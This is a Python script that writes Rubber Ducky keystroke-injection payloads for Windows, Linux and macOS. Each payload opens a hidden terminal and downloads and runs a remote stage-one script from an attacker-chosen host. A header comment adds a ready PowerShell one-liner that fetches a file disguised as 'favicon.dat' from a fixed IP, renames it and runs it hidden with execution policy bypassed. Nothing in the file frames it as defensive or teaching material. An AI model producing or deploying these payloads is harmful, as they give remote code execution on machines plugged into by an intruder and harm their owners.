# powershell -w hidden -ep bypass -Command "Invoke-WebRequest 'http://172.29.63.88:8080/favicon.dat' -OutFile $env:TEMP\favicon.dat; Rename-Item $env:TEMP\favicon.dat $env:TEMP\stage1.ps1; powershell -w hidden -ep bypass -File $env:TEMP\stage1.ps1"
# CHANGE DUCKI SCRIPT FOR WINDOWS IF YOU SEE THIS TELL ABOUT IT IN CHAT



import sys

def generate_ducky(ip, port, delay_ms, output_path, os_type):
    os_type = os_type.lower()

    if os_type == 'windows':
        ducky = f"""DELAY {delay_ms}
GUI r
DELAY 400
STRING powershell -WindowStyle Hidden -nop -c "iex(iwr -UseBasicParsing http://{ip}:{port}/favicon.dat)"
ENTER
"""

    elif os_type == 'linux':
        ducky = f"""DELAY {delay_ms}
CTRL ALT t
DELAY 500
STRING bash -c 'curl http://{ip}:{port}/final_stage1.sh | bash'
ENTER
"""
    elif os_type == 'mac':
        ducky = f"""DELAY {delay_ms}
GUI space
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING osascript -e 'do shell script "curl http://{ip}:{port}/final_stage1.sh | bash"'
ENTER
"""
    else:
        raise ValueError(f"Unsupported OS: {os_type}")

    with open(output_path, 'w') as f:
        f.write(ducky)

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: generate_ducky.py <ip> <port> <delay_ms> <output_file> <os>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    delay = sys.argv[3]
    output = sys.argv[4]
    os_type = sys.argv[5]

    generate_ducky(ip, port, delay, output, os_type)
    print(f"Generated Ducky script for {os_type} at {output}")
